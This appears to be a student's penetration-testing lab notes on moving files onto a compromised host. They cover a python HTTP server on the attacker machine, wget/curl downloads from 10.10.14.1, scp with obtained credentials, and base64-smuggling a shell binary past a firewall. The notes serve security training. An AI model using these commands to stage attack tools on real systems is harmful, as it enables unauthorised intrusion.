Transferring files to the remote server such as enumeration scripts or exploits or trnasfer data back to out attack host. While tools like Metasploit with a Meterpreter shell allow us to user the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

---
## Using wget

1) running a python HTTP server on our machine and then using wget or cURL to download the files on the remote host. First, we go into the directory that contains the file we need to transfer and run a python http server in it.
```
kwc0827@htb[/htb]$ cd /tmp
kwc0827@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
The server above serves as listening server on our machine, we can download the file on the remote host that we have code execution on:

```
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```
Note that we used IP 10.10.14.1 and the port out Python server runs on 8000. If the remote server does not have wget, we can use cURL to download the file. 

```
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```
-o flag is used to specify the output file name.

----
## Using SCP

Another method is using scp, granted we have obtained ssh user credentials on the remote host
```
kwc0827@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```
Specified the local file name after scp, and the remote directly will be save to after the :.

----
## Using Base 64
In some cases, might not be able to transfer the file. The remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base 64 encode the file into base 64 format, and then we can paste the base 64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base 64 encode it as follows,

```
kwc0827@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
Here, the shell is input file, being processed by the base 64 command. -w option specifices the line width for the output. Therefore, -w 0 disables line wrapping, meaning the entire base 64 encoded content is written as a single continuous line. By default, it wraps with 76 characters.

Now, we can copy this base 64 string, go to the remote host, and use base 64 -d to decode it, and pipe the output into a file.

```
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---
## Validating File Transfers
To validate the format of a file, we can run the file command on it
```
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

```
When file command on the shell file, it says it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md 5 hash. On our machine, we can run md 5 sum on it.
```
kwc0827@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
Now we can go to the remote server and run the  same command on the file we transferred

```
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
Both file have the same md 5 hash, meaning the file was tranferred correctly. 